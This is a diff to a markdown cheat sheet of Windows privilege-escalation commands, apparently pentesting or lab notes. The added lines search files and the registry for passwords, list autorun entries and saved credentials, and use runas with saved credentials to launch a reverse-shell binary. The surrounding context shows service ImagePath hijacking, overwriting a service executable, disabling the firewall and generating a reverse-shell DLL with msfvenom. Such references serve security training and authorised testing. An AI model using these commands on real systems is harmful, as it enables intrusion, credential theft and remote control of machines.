@@ -31,7 +31,9 @@
     - `tasklist /svc`
 ## Enumerating files & directories
 - search files for passwords
-    - `findstr /si password *.txt | *.xml | *.xls`
+    - `findstr /si password *.txt | *.xml | *.xls | *.ini`
+- search files with pass in the name, or a config file
+    - `dir /s *pass* == *.config`
 - tree of C drive
     - `tree /F /A c:\ > tree.txt`
 - search for all PDFs
@@ -67,7 +69,10 @@
     - `reg add HKLM\SYSTEM\CurrentControlSet\services\{service} /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f` 
     - flags/values may differ, consult [documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add) for specific cases
 - search registry for a password
-    - `reg query HKLM /f password /t REG_SZ /s`
+    - `reg query HKLM /f password /t REG_SZ /s` - system
+    - `reg query HKCU /f password /t REG_SZ /s` - user
+- query registry for autorun programs
+    - `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run `
 
 # Other
 - disable firewall
@@ -79,3 +84,6 @@
     - `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" `
 - create a reverse shell DLL 
     - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip-address} LPORT={port} -f dll -o hijackme.dll`
+- search for saved credentials & exploit them
+    - `cmdkey /list`
+    - `runas /savecred /user:{user} C:\PrivEsc\reverse.exe `
